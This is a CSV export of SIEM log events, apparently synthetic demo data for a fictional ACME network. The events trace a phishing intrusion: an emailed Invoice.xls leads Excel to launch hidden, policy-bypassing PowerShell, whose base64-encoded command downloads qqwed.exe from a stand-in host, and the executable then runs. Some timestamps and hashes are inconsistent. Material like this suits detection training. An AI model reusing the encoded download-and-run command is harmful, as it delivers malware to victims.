"Application","Object","Object Name","URL","Subject","Version","Command","Process Name","Process ID","Quantity","Amount","Size","Rate","Duration","Session","Known Application","Host (Impacted) KBytes Rcvd","Host (Impacted) KBytes Sent","Host (Impacted) KBytes Total","Host (Impacted) Packets Rcvd","Host (Impacted) Packets Sent","Host (Impacted) Packets Total","Classification","Common Event","Priority","Direction","Severity","Vendor Message ID","MPE Rule Name","Host (Origin)","Host (Impacted)","MAC Address (Origin)","MAC Address (Impacted)","Interface (Origin)","Interface (Impacted)","IP Address (Origin)","IP Address (Impacted)","NAT IP Address (Origin)","NAT IP Address (Impacted)","Hostname (Origin)","Hostname (Impacted)","Known Host (Origin)","Known Host (Impacted)","User (Origin)","User (Impacted)","Sender","Recipient","Group","Entity (Origin)","Entity (Impacted)","Zone (Origin)","Zone (Impacted)","Location (Origin)","Location (Impacted)","Country (Origin)","Country (Impacted)","Region (Origin)","Region (Impacted)","Log Date","Log Count","Log Source Entity","Log Source Type","Log Source Host","Log Source","Log Sequence Number","Log Message","First Log Date","Last Log Date","Network (Origin)","Network (Impacted)","Domain","Protocol","TCP/UDP Port (Origin)","TCP/UDP Port (Impacted)","NAT TCP/UDP Port (Origin)","NAT TCP/UDP Port (Impacted)"
"HTTP","incomplete","end",,"z-ACME Link",,"Deny_ACME_Internet","any",,,,,,18,"115006","HTTP",0.251953125,0.119140625,0.37109375,,,,"Network Deny","Traffic Denied by Network Firewall",19,"Outbound",,"TRAFFIC","Session Denied At Application Layer","172.16.0.19","93.184.216.34",,,,,"172.16.0.19","93.184.216.34","0.0.0.0","93.184.216.34",,,,,,,,,"z-ACME-cxc","LogRhythm SIP","Global Entity","Internal","External",,"United States, Virginia, Roanoke",,"United States",,"Virginia","01/04/2018 5:03:03 pm",1,"LogRhythm SIP","ECHO - Palo Alto Networks","LRXM","LRXM Palo Alto Networks",,"1,2018/01/04 12:03:00,001801011183,TRAFFIC,end,0,2018/01/04 12:03:00,172.16.0.19,93.184.216.34,0.0.0.0,93.184.216.34,Deny_ACME_Internet,,,incomplete,vsys1,z-ACME-cxc,z-ACME Link,ethernet1/3.251,ethernet1/1,ACME_Syslog,2018/01/04 12:03:00,115006,1,2013,80,42096,80,0x40401c,tcp,deny,380,258,122,0,22018/01/04 12:03:00,18,any,0,69169405283,0x0,172.16.0.0-172.16.0.255,US,0,4,2,tcp-fin","01/04/2018 5:03:03 pm","01/04/2018 5:03:03 pm",,,,"TCP",2013,80,,
,"C:\\Users\\bsmith\\AppData\\Local\\Temp\"",,,,,"C:\\Users\\bsmith\\AppData\\Local\\Temp\\qqwed.exe","qqwed.exe",4337,,,,,,"0x4f2f791",,,,,,,,"Startup and Shutdown","Process/Service Started",22,"Local","Information","1","EVID 1 : Process Created","LRXM *","LRXM *",,,,,,"192.168.0.42",,,"lrxm","LRXM","LRXM","LRXM","bsmith",,,,"3","LogRhythm SIP","LogRhythm SIP","Internal","Internal",,,,,,,"01/04/2018 5:02:59 pm",1,"LogRhythm SIP","ECHO - MS Windows Event Logging XML - Sysmon","LRXM","LRXM Sysmon",,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Keywords></Keywords><TimeCreated SystemTime='2018-02-04T12:02:58.581234567Z'/><EventRecordID>19809313</EventRecordID><Correlation/><Execution ProcessID='4592' ThreadID='7080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LRXM</Computer><Security UserID='NT AUTHORITY\\SYSTEM'/></System><EventData>Process Create:\r\nUtcTime: 2018-02-04T17:02:58.586425786Z\r\nProcessGuid: {43dc7420-5dce-4050-85f1-2f96282ca54e}\r\nProcessId: 4337\r\nImage: C:\\Users\\bsmith\\AppData\\Local\\Temp\\qqwed.exe\r\nCommandLine: C:\\Users\\bsmith\\AppData\\Local\\Temp\\qqwed.exe\r\nCurrentDirectory: C:\\Users\\bsmith\\AppData\\Local\\Temp\\\r\nUser: ACME\\bsmith\r\nLogonGuid: {e90c18da-5ed7-5903-0000-002091f7f204}\r\nLogonId: 0x4f2f791\r\nTerminalSessionId: 3\r\nIntegrityLevel: Medium\r\nHashes: SHA1=6233778c733daa00ce5b9b25aae0a3cb\r\nParentProcessGuid: {43dc7420-5dce-4050-85f1-2f96282ca54e}\r\nParentProcessId: 9786\r\nParentImage: C:\\Windows\\system32\\svchost.exe\r\nParentCommandLine: C:\\Users\\bsmith\\AppData\\Local\\Temp\\qqwed.exe </EventData></Event>","01/04/2018 5:02:59 pm","01/04/2018 5:02:59 pm",,,,,,,,
,"C:\\Windows\\system32\"",,,,,"C:\\Users\\bsmith\\AppData\\Local\\Temp\\qqwed.exe","svchost.exe",9786,,,,,,"0x4f2f791",,,,,,,,"Startup and Shutdown","Process/Service Started",22,"Local","Information","1","EVID 1 : Process Created","LRXM *","LRXM *",,,,,,"192.168.0.42",,,"lrxm","LRXM","LRXM","LRXM","bsmith",,,,"3","LogRhythm SIP","LogRhythm SIP","Internal","Internal",,,,,,,"01/04/2018 5:02:55 pm",1,"LogRhythm SIP","ECHO - MS Windows Event Logging XML - Sysmon","LRXM","LRXM Sysmon",,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Keywords></Keywords><TimeCreated SystemTime='2018-02-04T12:02:53.531234567Z'/><EventRecordID>19809313</EventRecordID><Correlation/><Execution ProcessID='4592' ThreadID='7080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LRXM</Computer><Security UserID='NT AUTHORITY\\SYSTEM'/></System><EventData>Process Create:\r\nUtcTime: 2018-02-04T17:02:53.536365662Z\r\nProcessGuid: {43dc7420-5dce-4050-85f1-2f96282ca54e}\r\nProcessId: 9786\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nCommandLine: C:\\Users\\bsmith\\AppData\\Local\\Temp\\qqwed.exe\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: ACME\\bsmith\r\nLogonGuid: {e90c18da-5ed7-5903-0000-002091f7f204}\r\nLogonId: 0x4f2f791\r\nTerminalSessionId: 3\r\nIntegrityLevel: Medium\r\nHashes: SHA1=4eea9bdfe0eb41759d96ec9bd224c4519314a8fa\r\nParentProcessGuid: {d4fbe8ff-5eda-466f-8922-9ccdbcff2f88}\r\nParentProcessId: 4004\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: ""powershell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHIAcAB0AD8AaQBkAD0AcQB3ADgANgBkAGYAZABmADQANAAiACwAIgBxAHEAdwBlAGQALgBlAHgAZQAiACkA"" </EventData></Event>","01/04/2018 5:02:55 pm","01/04/2018 5:02:55 pm",,,,,,,,
"HTTP","C:\\Windows\\System32\\WindowsPowerShell\\v1.0\"",,,,,,"powershell.exe",4004,,,,,,,"HTTP",,,,,,,"Network Traffic","Network Connection Established",11,"Outbound","Information","3","EVID 3 : Network Connection","LRXM *","93.184.216.34",,,,,"172.16.0.19","93.184.216.34",,,"lrxm",,"LRXM",,"bsmith",,,,,"LogRhythm SIP","Global Entity","Internal","External",,"United States, Virginia, Roanoke",,"United States",,"Virginia","01/04/2018 5:02:51 pm",1,"LogRhythm SIP","ECHO - MS Windows Event Logging XML - Sysmon","LRXM","LRXM Sysmon",,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>3</EventID><Version>5</Version><Level>Information</Level><Task>Network connection detected (rule: NetworkConnect)</Task><Opcode>Info</Opcode><Keywords></Keywords><TimeCreated SystemTime='2018-02-04T12:02:48.481234567Z'/><EventRecordID>21486</EventRecordID><Correlation/><Execution ProcessID='4036' ThreadID='4072'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LRXM</Computer><Security UserID='NT AUTHORITY\\SYSTEM'/></System><EventData>Network connection detected:\r\nUtcTime: 2018-02-04T17:02:48.486302937Z\r\nProcessGuid: {d4fbe8ff-5eda-466f-8922-9ccdbcff2f88}\r\nProcessId: 4004\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nUser: ACME\\bsmith\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 172.16.0.19\r\nSourceHostname: LRXM\r\nSourcePort: 53777\r\nSourcePortName: \r\nDestinationIsIpv6: false\r\nDestinationIp: 93.184.216.34\r\nDestinationHostname: \r\nDestinationPort: 80\r\nDestinationPortName: http</EventData></Event><EventData><EventData><Data Name='UtcTime'>2017-04-28 17:12:32.559</Data><Data Name='ProcessGuid'>{D8AFD204-0977-5902-0000-00106DF76E00}</Data><Data Name='ProcessId'>9524</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='User'>SIP01\\Administrator</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>172.16.0.31</Data><Data Name='SourceHostname'>SIP01</Data><Data Name='SourcePort'>53777</Data><Data Name='SourcePortName'></Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>93.184.216.34</Data><Data Name='DestinationHostname'></Data><Data Name='DestinationPort'>80</Data><Data Name='DestinationPortName'>http</Data></EventData>","01/04/2018 5:02:51 pm","01/04/2018 5:02:51 pm",,,,"TCP",53777,80,,
"HTTP","C:\\Windows\\System32\\WindowsPowerShell\\v1.0\"",,,,,,"powershell.exe",4004,,,,,,,"HTTP",,,,,,,"Network Traffic","Network Connection Established",11,"Outbound","Information","3","EVID 3 : Network Connection","LRXM *","93.184.216.34",,,,,"172.16.0.19","93.184.216.34",,,"lrxm",,"LRXM",,"bsmith",,,,,"LogRhythm SIP","Global Entity","Internal","External",,"United States, Virginia, Roanoke",,"United States",,"Virginia","01/04/2018 5:02:51 pm",1,"LogRhythm SIP","ECHO - MS Windows Event Logging XML - Sysmon","LRXM","LRXM Sysmon",,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>3</EventID><Version>5</Version><Level>Information</Level><Task>Network connection detected (rule: NetworkConnect)</Task><Opcode>Info</Opcode><Keywords></Keywords><TimeCreated SystemTime='2018-02-04T12:02:48.481234567Z'/><EventRecordID>21486</EventRecordID><Correlation/><Execution ProcessID='4036' ThreadID='4072'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LRXM</Computer><Security UserID='NT AUTHORITY\\SYSTEM'/></System><EventData>Network connection detected:\r\nUtcTime: 2018-02-04T17:02:48.486302937Z\r\nProcessGuid: {d4fbe8ff-5eda-466f-8922-9ccdbcff2f88}\r\nProcessId: 4004\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nUser: ACME\\bsmith\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 172.16.0.19\r\nSourceHostname: LRXM\r\nSourcePort: 53777\r\nSourcePortName: \r\nDestinationIsIpv6: false\r\nDestinationIp: 93.184.216.34\r\nDestinationHostname: \r\nDestinationPort: 80\r\nDestinationPortName: http</EventData></Event><EventData><EventData><Data Name='UtcTime'>2017-04-28 17:12:32.559</Data><Data Name='ProcessGuid'>{D8AFD204-0977-5902-0000-00106DF76E00}</Data><Data Name='ProcessId'>9524</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='User'>SIP01\\Administrator</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>172.16.0.31</Data><Data Name='SourceHostname'>SIP01</Data><Data Name='SourcePort'>53777</Data><Data Name='SourcePortName'></Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>93.184.216.34</Data><Data Name='DestinationHostname'></Data><Data Name='DestinationPort'>80</Data><Data Name='DestinationPortName'>http</Data></EventData>","01/04/2018 5:02:51 pm","01/04/2018 5:02:51 pm",,,,"TCP",53777,80,,
"HTTP","incomplete","end",,"z-ACME Link",,"Allow_ACME_Internet","any",,,,,,18,"115005","HTTP",0.251953125,0.119140625,0.37109375,6,,6,"Network Allow","Traffic Allowed by Network Firewall",11,"Outbound",,"TRAFFIC","Session Traffic Allowed","172.16.0.19","93.184.216.34",,,,,"172.16.0.19","93.184.216.34","0.0.0.0","93.184.216.34",,,,,,,,,"z-ACME-cxc","LogRhythm SIP","Global Entity","Internal","External",,"United States, Virginia, Roanoke",,"United States",,"Virginia","01/04/2018 5:02:51 pm",1,"LogRhythm SIP","ECHO - Palo Alto Networks","LRXM","LRXM Palo Alto Networks",,"1,2018/01/04 12:02:47,001801011183,TRAFFIC,end,0,2018/01/04 12:02:47,172.16.0.19,93.184.216.34,0.0.0.0,93.184.216.34,Allow_ACME_Internet,,,incomplete,vsys1,z-ACME-cxc,z-ACME Link,ethernet1/3.251,ethernet1/1,ACME_Syslog,2018/01/04 12:02:47,115005,1,53777,80,42096,80,0x40401c,tcp,allow,380,258,122,6,22018/01/04 12:02:47,18,any,0,69169405283,0x0,172.16.0.0-172.16.0.255,US,0,4,2,tcp-fin","01/04/2018 5:02:51 pm","01/04/2018 5:02:51 pm",,,,"TCP",53777,80,,
"HTTP","incomplete","end",,"z-ACME Link",,"Allow_ACME_Internet","any",,,,,,18,"115005","HTTP",0.251953125,0.119140625,0.37109375,6,,6,"Network Allow","Traffic Allowed by Network Firewall",11,"Outbound",,"TRAFFIC","Session Traffic Allowed","172.16.0.19","93.184.216.34",,,,,"172.16.0.19","93.184.216.34","0.0.0.0","93.184.216.34",,,,,,,,,"z-ACME-cxc","LogRhythm SIP","Global Entity","Internal","External",,"United States, Virginia, Roanoke",,"United States",,"Virginia","01/04/2018 5:02:51 pm",1,"LogRhythm SIP","ECHO - Palo Alto Networks","LRXM","LRXM Palo Alto Networks",,"1,2018/01/04 12:02:47,001801011183,TRAFFIC,end,0,2018/01/04 12:02:47,172.16.0.19,93.184.216.34,0.0.0.0,93.184.216.34,Allow_ACME_Internet,,,incomplete,vsys1,z-ACME-cxc,z-ACME Link,ethernet1/3.251,ethernet1/1,ACME_Syslog,2018/01/04 12:02:47,115005,1,53777,80,42096,80,0x40401c,tcp,allow,380,258,122,6,22018/01/04 12:02:47,18,any,0,69169405283,0x0,172.16.0.0-172.16.0.255,US,0,4,2,tcp-fin","01/04/2018 5:02:51 pm","01/04/2018 5:02:51 pm",,,,"TCP",53777,80,,
"?/UDP","NOERROR",,"www.example.com",,,"A",,,,,,,,"dd67",,,,,,,,"Information","DNS Query",5,"Unknown",,,"Query With Recursion Desired","www.example.com","93.184.216.34",,,,,,"93.184.216.34",,,"www.example.com",,,,,,,,,"LogRhythm SIP","Global Entity","Unknown","External",,"United States, Virginia, Roanoke",,"United States",,"Virginia","01/04/2018 5:02:47 pm",1,"LogRhythm SIP","ECHO - Microsoft Windows 2012 DNS","LRXM","LRXM Win 2012 DNS",,"04/01/2018 12:02:42 PM 0E2C PACKET  00000106B8BD8080 UDP Snd 93.184.216.34    dd67   Q [0001   D   NOERROR] A      www.example.com","01/04/2018 5:02:47 pm","01/04/2018 5:02:47 pm",,,,"UDP",,,,
"?/UDP","NOERROR",,"www.example.com",,,"AAAA",,,,,,,,"09e7",,,,,,,,"Information","DNS Query",5,"External",,,"Response Query With Recursion","www.example.com (93.184.216.34)",,,,,,"93.184.216.34",,,,"www.example.com",,,,,,,,,"Global Entity","LogRhythm SIP","External","Unknown","United States, Virginia, Roanoke",,"United States",,"Virginia",,"01/04/2018 5:02:47 pm",1,"LogRhythm SIP","ECHO - Microsoft Windows 2012 DNS","LRXM","LRXM Win 2012 DNS",,"04/01/2018 12:02:42 PM 0E2C PACKET  00000106B958B560 UDP Rcv 93.184.216.34    09e7 R Q [8081   DR  NOERROR] AAAA   www.example.com","01/04/2018 5:02:47 pm","01/04/2018 5:02:47 pm",,,,"UDP",,,,
"?/UDP","NOERROR",,"www.example.com",,,"AAAA",,,,,,,,"09e7",,,,,,,,"Information","DNS Query",5,"Unknown",,,"Query With Recursion Desired","www.example.com","93.184.216.34",,,,,,"93.184.216.34",,,"www.example.com",,,,,,,,,"LogRhythm SIP","Global Entity","Unknown","External",,"United States, Virginia, Roanoke",,"United States",,"Virginia","01/04/2018 5:02:47 pm",1,"LogRhythm SIP","ECHO - Microsoft Windows 2012 DNS","LRXM","LRXM Win 2012 DNS",,"04/01/2018 12:02:42 PM 0E2C PACKET  00000106B9753D50 UDP Snd 93.184.216.34    09e7   Q [0001   D   NOERROR] AAAA   www.example.com","01/04/2018 5:02:47 pm","01/04/2018 5:02:47 pm",,,,"UDP",,,,
"?/UDP","NOERROR",,"www.example.com",,,"A",,,,,,,,"dd67",,,,,,,,"Information","DNS Query",5,"External",,,"Response Query With Recursion","www.example.com (93.184.216.34)",,,,,,"93.184.216.34",,,,"www.example.com",,,,,,,,,"Global Entity","LogRhythm SIP","External","Unknown","United States, Virginia, Roanoke",,"United States",,"Virginia",,"01/04/2018 5:02:47 pm",1,"LogRhythm SIP","ECHO - Microsoft Windows 2012 DNS","LRXM","LRXM Win 2012 DNS",,"04/01/2018 12:02:42 PM 0E2C PACKET  00000106B9640D10 UDP Rcv 93.184.216.34    dd67 R Q [8081   DR  NOERROR] A      www.example.com","01/04/2018 5:02:47 pm","01/04/2018 5:02:47 pm",,,,"UDP",,,,
,"C:\\Program Files\\Microsoft Office\\Office15\"",,,,,"""C:\\Program Files\\Microsoft Office\\Office15\\EXCEL.EXE"" /dde","EXCEL.EXE",5716,,,,,,"0x4f2f791",,,,,,,,"Startup and Shutdown","Process/Service Started",22,"Local","Information","1","EVID 1 : Process Created","LRXM *","LRXM *",,,,,,"192.168.0.42",,,"lrxm","LRXM","LRXM","LRXM","bsmith",,,,"3","LogRhythm SIP","LogRhythm SIP","Internal","Internal",,,,,,,"01/04/2018 5:02:43 pm",1,"LogRhythm SIP","ECHO - MS Windows Event Logging XML - Sysmon","LRXM","LRXM Sysmon",,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Keywords></Keywords><TimeCreated SystemTime='2018-02-04T12:02:39.391234567Z'/><EventRecordID>19809313</EventRecordID><Correlation/><Execution ProcessID='4592' ThreadID='7080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LRXM</Computer><Security UserID='NT AUTHORITY\\SYSTEM'/></System><EventData>Process Create:\r\nUtcTime: 2018-02-04T17:02:39.395854490Z\r\nProcessGuid: {e90c18da-6a3a-5903-0000-001066f01b05}\r\nProcessId: 5716\r\nImage: C:\\Program Files\\Microsoft Office\\Office15\\EXCEL.EXE\r\nCommandLine: ""C:\\Program Files\\Microsoft Office\\Office15\\EXCEL.EXE"" /dde\r\nCurrentDirectory: C:\\Users\\bsmith\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\\r\nUser: ACME\\bsmith\r\nLogonGuid: {e90c18da-5ed7-5903-0000-002091f7f204}\r\nLogonId: 0x4f2f791\r\nTerminalSessionId: 3\r\nIntegrityLevel: Medium\r\nHashes: SHA1=05c7384911ae95818668736b86a0df56d8c19e2e\r\nParentProcessGuid: {e90c18da-6255-5903-0000-00106b1c1905}\r\nParentProcessId: 4512\r\nParentImage: C:\\Program Files\\Microsoft Office\\Office15\\OUTLOOK.EXE\r\nParentCommandLine: ""C:\\Program Files\\Microsoft Office\\Office15\\OUTLOOK.EXE"" </EventData></Event>","01/04/2018 5:02:43 pm","01/04/2018 5:02:43 pm",,,,,,,,
,"C:\\Users\\bsmith\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.Outlook\\1GAF11VU\\Invoice.xls",,,,,,"OUTLOOK.EXE",4512,,,,,,,,,,,,,,"Access Success","Object Modified",22,"Local","Information","2","EVID 2 : File Creation Time Changed","LRXM *","LRXM *",,,,,,"192.168.0.42",,,"lrxm","LRXM","LRXM","LRXM",,,,,,"LogRhythm SIP","LogRhythm SIP","Internal","Internal",,,,,,,"01/04/2018 5:02:43 pm",1,"LogRhythm SIP","ECHO - MS Windows Event Logging XML - Sysmon","LRXM","LRXM Sysmon",,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>2</EventID><Version>4</Version><Level>Information</Level><Task>File creation time changed (rule: FileCreateTime)</Task><Opcode>Info</Opcode><Keywords></Keywords><TimeCreated SystemTime='2018-02-04T12:02:39.391234567Z'/><EventRecordID>19839388</EventRecordID><Correlation/><Execution ProcessID='2620' ThreadID='2680'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LRXM</Computer><Security UserID='NT AUTHORITY\\SYSTEM'/></System><EventData>File creation time changed:\r\nUtcTime: 2018-02-04T17:02:39.395968548Z\r\nProcessGuid: {e90c18da-6255-5903-0000-00106b1c1905}\r\nProcessId: 4512\r\nImage: C:\\Program Files\\Microsoft Office\\Office15\\OUTLOOK.EXE\r\nTargetFilename: C:\\Users\\bsmith\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.Outlook\\1GAF11VU\\Invoice.xls\r\nCreationUtcTime: 2018-02-04T17:02:39.395968548Z\r\nPreviousCreationUtcTime: 2017-02-28T12:02:39.395978642Z</EventData></Event>","01/04/2018 5:02:43 pm","01/04/2018 5:02:43 pm",,,,,,,,
,"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\"",,,,,"""powershell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHIAcAB0AD8AaQBkAD0AcQB3ADgANgBkAGYAZABmADQANAAiACwAIgBxAHEAdwBlAGQALgBlAHgAZQAiACkA""","powershell.exe",4004,,,,,,"0x4f2f791",,,,,,,,"Startup and Shutdown","Process/Service Started",22,"Local","Information","1","EVID 1 : Process Created","LRXM *","LRXM *",,,,,,"192.168.0.42",,,"lrxm","LRXM","LRXM","LRXM","bsmith",,,,"3","LogRhythm SIP","LogRhythm SIP","Internal","Internal",,,,,,,"01/04/2018 5:02:43 pm",1,"LogRhythm SIP","ECHO - MS Windows Event Logging XML - Sysmon","LRXM","LRXM Sysmon",,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Keywords></Keywords><TimeCreated SystemTime='2018-02-04T12:02:41.411234567Z'/><EventRecordID>19809313</EventRecordID><Correlation/><Execution ProcessID='4592' ThreadID='7080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LRXM</Computer><Security UserID='NT AUTHORITY\\SYSTEM'/></System><EventData>Process Create:\r\nUtcTime: 2018-02-04T17:02:41.416048452Z\r\nProcessGuid: {d4fbe8ff-5eda-466f-8922-9ccdbcff2f88}\r\nProcessId: 4004\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nCommandLine: ""powershell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHIAcAB0AD8AaQBkAD0AcQB3ADgANgBkAGYAZABmADQANAAiACwAIgBxAHEAdwBlAGQALgBlAHgAZQAiACkA""\r\nCurrentDirectory: C:\\Users\\bsmith\\AppData\\Local\\Temp\\\r\nUser: ACME\\bsmith\r\nLogonGuid: {e90c18da-5ed7-5903-0000-002091f7f204}\r\nLogonId: 0x4f2f791\r\nTerminalSessionId: 3\r\nIntegrityLevel: Medium\r\nHashes: SHA1=c824cf8885991307130156720fc4942b73b3f73e\r\nParentProcessGuid: {e90c18da-6a3a-5903-0000-001066f01b05}\r\nParentProcessId: 5716\r\nParentImage: C:\\Program Files\\Microsoft Office\\Office15\\EXCEL.EXE\r\nParentCommandLine: ""C:\\Program Files\\Microsoft Office\\Office15\\EXCEL.EXE"" /dde </EventData></Event>","01/04/2018 5:02:43 pm","01/04/2018 5:02:43 pm",,,,,,,,
,"C:\\Program Files\\Microsoft Office\\Office15\"",,,,,"""C:\\Program Files\\Microsoft Office\\Office15\\OUTLOOK.EXE""","OUTLOOK.EXE",4512,,,,,,"0x4f2f791",,,,,,,,"Startup and Shutdown","Process/Service Started",22,"Local","Information","1","EVID 1 : Process Created","LRXM *","LRXM *",,,,,,"192.168.0.42",,,"lrxm","LRXM","LRXM","LRXM","bsmith",,,,"3","LogRhythm SIP","LogRhythm SIP","Internal","Internal",,,,,,,"01/04/2018 5:01:42 pm",1,"LogRhythm SIP","ECHO - MS Windows Event Logging XML - Sysmon","LRXM","LRXM Sysmon",,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Keywords></Keywords><TimeCreated SystemTime='2018-01-04T12:01:39.391234567Z'/><EventRecordID>19808956</EventRecordID><Correlation/><Execution ProcessID='4592' ThreadID='7080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LRXM</Computer><Security UserID='NT AUTHORITY\\SYSTEM'/></System><EventData>Process Create:\r\nUtcTime: 2018-01-04T17:01:39.395770109Z\r\nProcessGuid: {e90c18da-6255-5903-0000-00106b1c1905}\r\nProcessId: 4512\r\nImage: C:\\Program Files\\Microsoft Office\\Office15\\OUTLOOK.EXE\r\nCommandLine: ""C:\\Program Files\\Microsoft Office\\Office15\\OUTLOOK.EXE"" \r\nCurrentDirectory: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Microsoft Office 2013\\\r\nUser: ACME\\bsmith\r\nLogonGuid: {e90c18da-5ed7-5903-0000-002091f7f204}\r\nLogonId: 0x4f2f791\r\nTerminalSessionId: 3\r\nIntegrityLevel: Medium\r\nHashes: SHA1=05c7384911ae95818668736b86a0df56d8c19e2e\r\nParentProcessGuid: {e90c18da-5edb-5903-0000-00109b5ef304}\r\nParentProcessId: 4140\r\nParentImage: C:\\Windows\\explorer.exe\r\nParentCommandLine: C:\\Windows\\Explorer.EXE</EventData></Event>","01/04/2018 5:01:42 pm","01/04/2018 5:01:42 pm",,,,,,,,